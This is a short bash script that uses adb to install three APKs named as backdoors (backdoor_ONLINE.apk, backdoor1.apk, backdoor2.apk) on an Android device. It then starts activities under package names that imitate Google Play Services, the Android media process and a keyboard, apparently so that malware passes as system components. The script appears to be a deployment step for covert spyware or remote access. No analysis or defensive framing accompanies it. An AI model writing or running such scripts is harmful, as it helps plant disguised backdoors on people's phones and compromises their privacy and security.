#!/bin/bash

adb install backdoor_ONLINE.apk
adb install backdoor1.apk
adb install backdoor2.apk

adb shell am start -n com.google.play.services/com.google.play.services.MainActivity
adb shell am start -n android.process.media.ui/android.process.media.ui.MainActivity
adb shell am start -n com.keyboard.input.uxpo/com.keyboard.input.uxpo.MainActivity

